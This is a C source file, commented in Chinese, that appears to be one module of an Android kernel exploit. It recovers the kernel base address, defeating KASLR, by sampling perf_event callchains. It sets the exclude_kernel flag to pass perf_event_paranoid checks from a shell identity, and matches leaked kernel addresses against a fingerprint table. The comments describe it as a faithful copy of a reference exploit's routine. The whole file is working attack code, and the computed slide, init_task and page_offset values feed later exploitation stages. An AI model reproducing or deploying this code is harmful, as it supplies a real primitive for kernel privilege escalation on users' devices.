/* kaslr.c — perf_event callchain 采样 → 内核基址
 * 1:1 复刻参考 get_kaslr_offset(0x6297c8)：
 *   perf_event_open(HW CPU_CYCLES, IP|TID|CALLCHAIN, flags=disabled|exclude_kernel)
 *   → mmap 8K 环 → RESET/ENABLE → 2e6 次 getpid 造样本 → DISABLE
 *   → 读 PERF_RECORD_SAMPLE → 用 (ip & 0x1fffff) 指纹表投票
 *
 * flags 的 exclude_kernel(0x21 的 bit5) 是关键：内核 perf_event_open 只在
 * !attr.exclude_kernel 时才调用 perf_allow_kernel()，Android 上
 * perf_event_paranoid >= 2 因此只放行 exclude_kernel=1 的采样。
 * 参考实现正是靠这一位在 shell 身份下也能 perf；我们先前只写 flags=1，
 * 所以一直吃 EACCES(13) → "[!] kaslr offset failed" → exit=4。
 */
#define _GNU_SOURCE
#include "ghost.h"

#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef PERF_TYPE_HARDWARE
#define PERF_TYPE_HARDWARE 0
#endif
#ifndef PERF_TYPE_SOFTWARE
#define PERF_TYPE_SOFTWARE 1
#endif
#ifndef PERF_COUNT_HW_CPU_CYCLES
#define PERF_COUNT_HW_CPU_CYCLES 0
#endif
#ifndef PERF_COUNT_SW_TASK_CLOCK
#define PERF_COUNT_SW_TASK_CLOCK 1
#endif

#define PERF_SAMPLE_IP 1ULL
#define PERF_SAMPLE_TID 2ULL
#define PERF_SAMPLE_CALLCHAIN 0x20ULL
/* disabled(bit0) | exclude_kernel(bit5) —— 参考实现 attr+0x28 的原始立即数 */
#define PERF_ATTR_FLAGS_REF 0x21ULL
#define PERF_PERIOD_REF 100000ULL   /* 参考 attr+0x10 = 0x186a0 */
#define PERF_SAMPLE_TYPE_REF (PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN) /* 0x23 */
#define PERF_GETPID_REF 2000000     /* 参考主循环计数 */
#define PERF_RECORD_SAMPLE 9
#define PERF_CALLCHAIN_MAX 64       /* 参考 cmp x1,#0x40 */
#define KERNEL_PTR_MIN 0xffff800000000000ULL

struct perf_event_attr_local {
    uint32_t type;
    uint32_t size;
    uint64_t config;
    uint64_t sample_period;
    uint64_t sample_type;
    uint64_t read_format;
    uint64_t flags;
    uint32_t wakeup_events;
    uint32_t bp_type;
    uint64_t config1;
    uint64_t config2;
};

/* perf_event_mmap_page 里 data_head/data_tail 的固定偏移 */
#define PERF_HEAD_OFF 0x400
#define PERF_TAIL_OFF 0x408

static inline uint64_t fnv_low21(uint64_t a) { return a & 0x1fffffULL; }

/* pass 0 = 参考实现那条；pass 1 = 同一 flags 的 software 兜底（仅诊断用） */
static int perf_open_ref(int pass)
{
    struct perf_event_attr_local attr;
    memset(&attr, 0, sizeof(attr));
    attr.type = pass == 0 ? PERF_TYPE_HARDWARE : PERF_TYPE_SOFTWARE;
    attr.size = sizeof(attr);
    attr.config = pass == 0 ? PERF_COUNT_HW_CPU_CYCLES : PERF_COUNT_SW_TASK_CLOCK;
    attr.sample_period = pass == 0 ? PERF_PERIOD_REF : 1ULL;
    attr.sample_type = PERF_SAMPLE_TYPE_REF;
    attr.flags = PERF_ATTR_FLAGS_REF;
    int fd = (int)syscall(__NR_perf_event_open, &attr, 0, -1, -1, 0);
    if (fd < 0)
        LOG("[!] perf_event_open failed errno=%d (%s; flags=%#llx)", errno,
            pass == 0 ? "hw" : "sw fallback", (unsigned long long)attr.flags);
    return fd;
}

static int perf_probe(int loops, uint64_t *ips, int max_ips)
{
    int fd = perf_open_ref(0);
    if (fd < 0) fd = perf_open_ref(1);
    if (fd < 0) return -errno;

    size_t pg = (size_t)sysconf(_SC_PAGESIZE);
    size_t ring = pg * 2;
    void *buf = mmap(NULL, ring, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) {
        LOG("[!] perf mmap failed errno=%d", errno);
        close(fd);
        return -errno;
    }
    uint8_t *meta = (uint8_t *)buf;
    uint8_t *data = meta + pg;

    /* ioctl 魔数直接写死，避免宏在 aarch64 上算错：
     * RESET=0x2403  ENABLE=0x2400  DISABLE=0x2401 */
    ioctl(fd, 0x2403, 0);
    ioctl(fd, 0x2400, 0);

    for (int i = 0; i < loops; i++) (void)syscall(__NR_getpid);

    ioctl(fd, 0x2401, 0);

    uint64_t head = *(volatile uint64_t *)(meta + PERF_HEAD_OFF);
    uint64_t tail = *(volatile uint64_t *)(meta + PERF_TAIL_OFF);
    int got = 0;
    uint64_t mask = pg - 1;

    while (tail < head && got < max_ips) {
        uint32_t off = (uint32_t)(tail & mask);
        uint32_t type = 0;
        uint16_t size = 0;
        memcpy(&type, data + off, 4);
        memcpy(&size, data + off + 6, 2);
        if (size < 8) { tail += 8; continue; }
        /* sample_type=0x23 的 TID 版布局：
         *   +0x08 ip   +0x10 tid   +0x18 nr   +0x20 起 ips[] */
        if (type == PERF_RECORD_SAMPLE && size >= 0x20) {
            uint64_t ip = 0, nr = 0;
            memcpy(&ip, data + off + 0x08, 8);
            memcpy(&nr, data + off + 0x18, 8);
            if (ip >= KERNEL_PTR_MIN) ips[got++] = ip;
            if (nr > 0 && nr <= PERF_CALLCHAIN_MAX) {
                for (uint64_t k = 0; k < nr && got < max_ips; k++) {
                    uint64_t a = 0;
                    memcpy(&a, data + off + 0x20 + k * 8, 8);
                    if (a >= KERNEL_PTR_MIN) ips[got++] = a;
                }
            }
        }
        tail += size;
    }
    *(volatile uint64_t *)(meta + PERF_TAIL_OFF) = tail;

    munmap(buf, ring);
    close(fd);
    DBG("perf samples=%d head=%llu", got, (unsigned long long)head);
    return got;
}

/* 每个候选基址投票，命中最多者胜（不改 g.*） */
static int kaslr_vote(const uint64_t *ips, int n, uint64_t *out_base, int *out_votes)
{
    if (!g_map || g_map->nfp <= 0) {
        LOG("[!] no fingerprint table for build");
        return -1;
    }
    uint64_t best_base = 0;
    int best_votes = -1;
    for (int i = 0; i < g_map->nfp; i++) {
        uint32_t key = g_map->fp[i].key;
        int64_t delta = g_map->fp[i].delta;
        int votes = 0;
        uint64_t cand = 0;
        for (int j = 0; j < n; j++) {
            if (fnv_low21(ips[j]) != key) continue;
            uint64_t b = (uint64_t)((int64_t)ips[j] + delta);
            if (b & 0x1fffffULL) continue;      /* 必须 2M 对齐 */
            if (b < 0xffffff8000000000ULL) continue;
            if (b > 0xffffffff00000000ULL) continue;
            cand = b;
            votes++;
        }
        DBG("fp[%d] key=%#x votes=%d base=%#llx", i, key, votes, (unsigned long long)cand);
        if (votes > best_votes) { best_votes = votes; best_base = cand; }
    }
    if (best_votes <= 0 || !best_base) {
        LOG("[!] kaslr fingerprint miss (samples=%d)", n);
        return -1;
    }
    *out_base = best_base;
    if (out_votes) *out_votes = best_votes;
    return 0;
}

/* preflight 用：小样本证明 perf 可用并给出候选基址，不改 g 的稳定状态 */
int perf_selftest(void)
{
    enum { SELFTEST_MAXIP = 512 };
    static uint64_t ips[SELFTEST_MAXIP];
    int n = perf_probe(PERF_GETPID_REF / 10, ips, SELFTEST_MAXIP);
    if (n < 0) {
        LOG("[selftest] perf FAIL errno=%d (flags=%#llx exclude_kernel)", -n,
            (unsigned long long)PERF_ATTR_FLAGS_REF);
        return n;
    }
    if (n == 0) {
        LOG("[selftest] perf open ok but no samples (paranoid or empty ring)");
        return -1;
    }
    uint64_t base = 0;
    int votes = 0;
    if (kaslr_vote(ips, n, &base, &votes) != 0) {
        LOG("[selftest] perf ok samples=%d, fingerprint miss", n);
        return -1;
    }
    LOG("[selftest] perf ok samples=%d base=%#llx slide=%#llx votes=%d", n,
        (unsigned long long)base, (unsigned long long)(base - GHOST_KIMAGE_DEFAULT), votes);
    return 0;
}

int get_kaslr_offset(uint64_t *out_base)
{
    if (g.slide) { *out_base = g.kbase; return 0; }

    enum { MAXIP = 4096 };
    static uint64_t ips[MAXIP];
    int n = perf_probe(PERF_GETPID_REF, ips, MAXIP);
    if (n <= 0) return -1;

    uint64_t best_base = 0;
    int best_votes = 0;
    if (kaslr_vote(ips, n, &best_base, &best_votes) != 0) return -1;

    g.kbase = best_base;
    g.slide = best_base - GHOST_KIMAGE_DEFAULT;
    g.page_off = GHOST_DM_BASE_DEFAULT + g.slide;
    g.init_task = g_map->init_task ? g_map->init_task + g.slide : 0;
    LOG("[+] kaslr base=%#llx slide=%#llx votes=%d", (unsigned long long)g.kbase,
        (unsigned long long)g.slide, best_votes);
    *out_base = g.kbase;
    return 0;
}

uint64_t ghost_slide(void) { return g.slide; }
